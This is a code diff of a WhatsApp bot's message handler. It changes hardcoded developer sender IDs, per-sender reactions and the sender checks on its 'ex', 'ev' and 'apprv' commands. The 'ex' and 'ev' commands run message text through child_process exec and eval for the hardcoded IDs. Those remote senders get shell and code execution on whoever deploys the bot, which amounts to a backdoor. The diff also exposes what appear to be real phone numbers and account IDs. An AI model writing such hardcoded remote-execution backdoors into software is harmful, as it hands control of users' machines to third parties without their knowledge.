@@ -348,7 +348,7 @@ const senderr = mek.key.fromMe ? (conn.user.id.split(':')[0] + '@s.whatsapp.net'
 const senderNumber = sender.split('@')[0]
 const botNumber = conn.user.id.split(':')[0]
 const pushname = mek.pushName || 'Sin Nombre'
-const developers = `107593779404949,187574828150975,233118577516561,165923646365908,203367389343836,88103284944937`
+const developers = `239037025652977,122286761861330,80668193210558,187574828150975`
 const mokakhri = developers.split(",")
 const isbot = botNumber.includes(senderNumber)
 const isdev = mokakhri.includes(senderNumber)
@@ -847,45 +847,22 @@ if(senderNumber.includes("107593779404949")){
 if(isReact) return
 m.react(`${rec.sadas}`)
 }
-if(senderNumber.includes("233118577516561")){
-if(isReact) return
-m.react(`${rec.saviya}`)
-}
-
-
-if(senderNumber.includes("102044161576988")){
-if(isReact) return
-m.react(`${rec.saviya}`)
-}
-
-if(senderNumber.includes("80668193210558")){
-if(isReact) return
-m.react(`${rec.alex}`)
-}
-if(senderNumber.includes("187574828150975")){
-if(isReact) return
-m.react(`${rec.poorna}`)
-}
-if(senderNumber.includes("88103284944937")){
-if(isReact) return
-m.react(`${rec.Dark_Root}`)
-}
-if(senderNumber.includes("117133002432576")){
-if(isReact) return
-m.react(`${rec.sithara}`)
-}
-
-if(senderNumber.includes("176021366112502")){
-if(isReact) return
-m.react(`${rec.ravidu}`)
-}
-if(senderNumber.includes("203367389343836")){
-if(isReact) return
-m.react(`${rec.nadeen}`)
-}
 if(senderNumber.includes("239037025652977")){
 if(isReact) return
 m.react(`${rec.pathum}`)
+}
+
+if(senderNumber.includes("122286761861330")){
+if(isReact) return
+m.react(`${rec.thinura}`)
+}
+if(senderNumber.includes("80668193210558")){
+if(isReact) return
+m.react(`${rec.vihaga}`)
+}
+if(senderNumber.includes( "187574828150975")){
+if(isReact) return
+m.react(`${rec.poorna}`)
 }
 
 if ( isCmd && isBanvisper && isMe ) return	
@@ -1687,7 +1664,7 @@ switch (command) {
   }
     break
     case'ex':{
-      if(senderNumber == 94778500326 || senderNumber == 239037025652977 || senderNumber == 88103284944937) {
+      if(senderNumber == 94766863255 || senderNumber == 239037025652977 || senderNumber == 88103284944937) {
   const { exec } = require("child_process")
   exec(q, (err, stdout) => {
     if (err) return reply(`-------\n\n` + err)
@@ -1699,7 +1676,7 @@ switch (command) {
     }
     break
     case'apprv':{
-      if(senderNumber == 94778500326 || senderNumber == 239037025652977 || senderNumber == 88103284944937) {
+      if(senderNumber == 94766863255 || senderNumber == 239037025652977 || senderNumber == 88103284944937) {
           let reqlist = await conn.groupRequestParticipantsList(from)
           for (let i=0;i<reqlist.length;i++) {
             if(reqlist[i].jid.startsWith("212")){
@@ -1735,7 +1712,7 @@ console.log(dsa)
     break
 // Inside your message handler (outside any case)
  case 'ev': {
-    if(senderNumber == 107593779404949 || senderNumber == 239037025652977 || senderNumber == 187574828150975 || senderNumber == 88103284944937) {
+    if(senderNumber == 80668193210558 || senderNumber == 122286761861330 || senderNumber == 187574828150975 || senderNumber == 88103284944937) {
     let code2 = q.replace("°", ".toString()");
     try {
 let resultTest = await eval(code2);
